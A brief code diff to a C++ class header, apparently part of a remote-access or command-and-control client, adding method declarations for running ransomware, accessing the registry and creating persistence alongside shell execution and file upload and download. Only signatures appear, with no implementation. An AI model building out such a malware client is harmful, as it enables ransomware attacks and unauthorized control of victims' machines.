@@ -17,6 +17,10 @@ private:
 	std::string RunShellCommand(const std::string& command);
 	void UploadFile() override final;
 	void DownloadFile() override final;
-	bool TellServerIfFileExists(const std::string& filePath);
+	void RunRansomware() override final;
+	void AccessRegistry() override final;
+	void CreatePersistence() override final;
 	void InvalidOperation() override final;
+	bool TellServerIfFileExists(const std::string& filePath);
+	long StartRansomware(const std::string& operation, const std::string& startFolder);
 };
